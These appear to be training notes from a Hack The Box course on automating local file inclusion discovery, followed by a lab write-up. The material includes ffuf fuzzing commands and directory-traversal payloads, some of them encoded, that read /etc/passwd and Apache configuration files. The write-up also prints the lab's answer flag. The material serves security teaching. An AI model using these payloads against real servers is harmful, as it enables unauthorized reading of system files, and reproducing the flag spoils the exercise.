﻿It is essential to understand how file inclusion attacks work and how we can manually craft advanced payloads and use custom techniques to reach remote code execution. This is because in many cases, for us to exploit the vulnerability, it may require a custom payload that matches its specific configurations. Furthermore, when dealing with security measures like a WAF or a firewall, we have to apply our understanding to see how a specific payload/character is being blocked and attempt to craft a custom payload to work around it.

We may not need to manually exploit the LFI vulnerability in many trivial cases. There are many automated methods that can help us quickly identify and exploit trivial LFI vulnerabilities. We can utilize fuzzing tools to test a huge list of common LFI payloads and see if any of them work, or we can utilize specialized LFI tools to test for such vulnerabilities. This is what we will discuss in this section.

---

## Fuzzing Parameters

The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.

The [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) module goes into details on how we can fuzz for`GET`/`POST` parameters. For example, we can fuzz the page for common`GET` parameters, as follows:


```shell-session
smoothment@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method : GET
 :: URL : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200,204,301,302,307,401,403
 :: Filter : Response size: xxx
________________________________________________

language [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests discussed in this module. This is not unique to LFI vulnerabilities but also applies to most web vulnerabilities discussed in other modules, as exposed parameters may be vulnerable to any other vulnerability as well.

**Tip:** For a more precise scan, we can limit our scan to the most popular LFI parameters found on this [link](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

---

## LFI wordlists

So far in this module, we have been manually crafting our LFI payloads to test for LFI vulnerabilities. This is because manual testing is more reliable and can find LFI vulnerabilities that may not be identified otherwise, as discussed earlier. However, in many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web applications where we need to test for various vulnerabilities.

There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the`?language=` parameter we have been testing throughout the module, as follows:

```shell-session
smoothment@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method : GET
 :: URL : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200,204,301,302,307,401,403
 :: Filter : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

As we can see, the scan yielded a number of LFI payloads that can be used to exploit the vulnerability. Once we have the identified payloads, we should manually test them to verify that they work as expected and show the included file content.

---

## Fuzzing Server Files

In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include:`Server webroot path`,`server configurations file`, and`server logs`.

#### Server Webroot

We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its`/uploads` directory through relative paths (e.g.`../../uploads`). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.

To do so, we can fuzz for the`index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g.`../../../../`), and then add our`index.php` afterwords.

The following is an example of how we can do all of this with ffuf:

```shell-session
smoothment@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method : GET
 :: URL : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200,204,301,302,307,401,403,405
 :: Filter : Response size: 2287
________________________________________________

/var/www/html/ [Status: 200, Size: 0, Words: 1, Lines: 1]
```

As we can see, the scan did indeed identify the correct webroot path at (`/var/www/html/`). We may also use the same [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist we used earlier, as it also contains various payloads that may reveal the webroot. If this does not help us in identifying the webroot, then our best choice would be to read the server configurations, as they tend to contain the webroot and other important information, as we'll see next.

#### Server Logs/Configurations

As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).

To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of`seclists`, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:


```shell-session
smoothment@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method : GET
 :: URL : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200,204,301,302,307,401,403,405
 :: Filter : Response size: 2287
________________________________________________

/etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

As we can see, the scan returned over 60 results, many of which were not identified with the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, which shows us that a precise scan is important in certain cases. Now, we can try reading any of these files to see whether we can get their content. We will read (`/etc/apache2/apache2.conf`), as it is a known path for the apache server configuration:


```shell-session
smoothment@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
 ServerAdmin webmaster@localhost
 DocumentRoot /var/www/html

 ErrorLog ${APACHE_LOG_DIR}/error.log
 CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/apache2/envvars`), and we can read it to find the variable values:


```shell-session
smoothment@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```

As we can see, the (`APACHE_LOG_DIR`) variable is set to (`/var/log/apache2`), and the previous configuration told us that the log files are`/access.log` and`/error.log`, which have accessed in the previous section.

**Note:** Of course, we can simply use a wordlist to find the logs, as multiple wordlists we used in this sections did show the log location. But this exercises shows us how we can manually go through identified files, and then use the information we find to further identify more files and important information. This is quite similar to when we read different file sources in the`PHP filters` section, and such efforts may reveal previously unknown information about the web application, which we can use to further exploit it.

---

## LFI Tools

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are not maintained and rely on the outdated`python2`, so using them may not be a long term solution. Try downloading any of the above tools and test them on any of the exercises we've used in this module to see their level of accuracy.


# Question
----

![Pasted image 20250218171815.png](../../../../IMAGES/Pasted%20image%2020250218171815.png)

Let's start by fuzzing parameters:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.55.155:35676/index.php?FUZZ=value'
```

Let's check:

```
FXpass [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 154ms]
FORMAT [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 157ms]
FILES [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 159ms]
FXuser [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 156ms]
FactoryId [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 156ms]
FactoryName [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 155ms]
FONE [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 163ms]
File [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 156ms]
Field [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 156ms]
FXimage [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 169ms]
FileIDs [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 156ms]
Fields [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 167ms]
FileName [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 155ms]
Filename [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 155ms]
Filter [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 155ms]
From [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 155ms]
GENDER [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 155ms]
```

So, we need to filter for `2309` size, let's do it:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.55.155:35676/index.php?FUZZ=value' -fs 2309 -ic -c -t 200
```

Now, we get this output:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.55.155:35676/index.php?FUZZ=value' -fs 2309 -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://94.237.55.155:35676/index.php?FUZZ=value
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Response size: 2309
________________________________________________

view [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 3735ms]
```

So, our parameter is `view`, let's fuzz using the LFI wordlist:

```
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.55.155:35676/index.php?view=FUZZ' -fs 1935
```

We can see this:

```
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.55.155:35676/index.php?view=FUZZ' -fs 1935

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://94.237.55.155:35676/index.php?view=FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Response size: 1935
________________________________________________

../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 250ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 254ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 255ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 263ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 340ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 340ms]
```

If we try that:

```
curl -s "http://94.237.55.155:35676/index.php?view=../../../../../../../../../../../../../../../../../../../etc/passwd"
```

```
<!DOCTYPE html>

<html lang="en">

<head>
 <meta charset="UTF-8">
 <title>Inlane Freight</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,700" rel="stylesheet">
 <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css'>
 <link rel="stylesheet" href="./style.css">
</head>

<body>
 <div class="navbar">
 <a href="#home">Inlane Freight</a>
 </div>
 <!-- partial:index.partial.html -->
 <div class="blog-card">
 <div class="meta">
 <div class="photo" style="background-image: url(./image.jpg)"></div>
 <ul class="details">
 <li class="author"><a href="#">John Doe</a></li>
 <li class="date">Aug. 24, 2019</li>
 </ul>
 </div>
 <div class="description">
 <h1>History</h1>
 <h2>Containers</h2>
 root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:103:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:104:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:105:107::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
barry:x:1000:1000::/home/barry:/bin/sh
 <p class="read-more">
 <a href="#">Read More</a>
 </p>
 </div>
 </div>
 <div class="blog-card alt">
 <div class="meta">
 <div class="photo" style="background-image: url(./image.jpg)"></div>
 <ul class="details">
 <li class="author"><a href="#">Jane Doe</a></li>
 <li class="date">July. 15, 2019</li>
 </ul>
 </div>
 <div class="description">
 <h1>Container Industry</h1>
 <h2>Opening a door to the future</h2>
 <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad eum dolorum architecto obcaecati enim dicta
 praesentium, quam nobis! Neque ad aliquam facilis numquam. Veritatis, sit.</p>
 <p class="read-more">
 <a href="#">Read More</a>
 </p>
 </div>
 </div>
 <!-- partial -->
</body>

</html>
```

We are indeed able to read `/etc/passwd`, let's try to read `/flag.txt`:

```
curl -s "http://94.237.55.155:35676/index.php?view=../../../../../../../../../../../../../../../../../../../flag.txt"
```

```
<!DOCTYPE html>

<html lang="en">

<head>
 <meta charset="UTF-8">
 <title>Inlane Freight</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,700" rel="stylesheet">
 <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css'>
 <link rel="stylesheet" href="./style.css">
</head>

<body>
 <div class="navbar">
 <a href="#home">Inlane Freight</a>
 </div>
 <!-- partial:index.partial.html -->
 <div class="blog-card">
 <div class="meta">
 <div class="photo" style="background-image: url(./image.jpg)"></div>
 <ul class="details">
 <li class="author"><a href="#">John Doe</a></li>
 <li class="date">Aug. 24, 2019</li>
 </ul>
 </div>
 <div class="description">
 <h1>History</h1>
 <h2>Containers</h2>
 HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
 <p class="read-more">
 <a href="#">Read More</a>
 </p>
 </div>
 </div>
 <div class="blog-card alt">
 <div class="meta">
 <div class="photo" style="background-image: url(./image.jpg)"></div>
 <ul class="details">
 <li class="author"><a href="#">Jane Doe</a></li>
 <li class="date">July. 15, 2019</li>
 </ul>
 </div>
 <div class="description">
 <h1>Container Industry</h1>
 <h2>Opening a door to the future</h2>
 <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad eum dolorum architecto obcaecati enim dicta
 praesentium, quam nobis! Neque ad aliquam facilis numquam. Veritatis, sit.</p>
 <p class="read-more">
 <a href="#">Read More</a>
 </p>
 </div>
 </div>
 <!-- partial -->
</body>

</html>
```

We got our flag:

```
HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
```
